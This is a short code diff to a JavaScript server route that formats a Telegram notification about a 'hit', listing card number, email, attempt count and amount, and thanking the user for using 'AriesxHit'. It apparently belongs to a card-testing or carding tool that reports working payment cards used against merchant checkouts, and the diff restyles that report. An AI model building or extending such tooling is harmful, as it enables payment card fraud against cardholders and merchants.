@@ -234,15 +234,14 @@ router.post('/notify-hit', async (req, res) => {
   }
   const emailDisplay = (email && String(email).trim()) || '—';
   const timeDisplay = (time_sec != null && time_sec !== '') ? `${time_sec}s` : '—';
-  const hitText = `<b>New Hit</b>\n` +
-    `Card: <code>${cardDisplay}</code>\n` +
-    `Email: ${emailDisplay}\n` +
-    `Attempt: ${attempts ?? '—'}\n` +
-    `Amount: ${amtFormatted}\n` +
-    `Business URL: ${businessUrl}\n` +
-    `Time: ${timeDisplay}\n` +
-    `Open Success URL (${success_url || '—'})\n\n` +
-    `Thanks For Using AriesxHit. ❤️`;
+  const hitText = `🎯 <b>HIT DETECTED</b>\n` +
+    `─────────────────\n\n` +
+    `Card :- ${cardDisplay}\n` +
+    `Email :- ${emailDisplay}\n` +
+    `Attempt :- ${attempts ?? '—'}\n` +
+    `Amount :- ${amtFormatted}\n` +
+    `Time :- ${timeDisplay}\n\n` +
+    `Thanks For Using Ariesxhit. ❤️`;
   console.log('[HIT_NOTIFICATION] Sending notification to Telegram user:', tgId);
 
   let result;
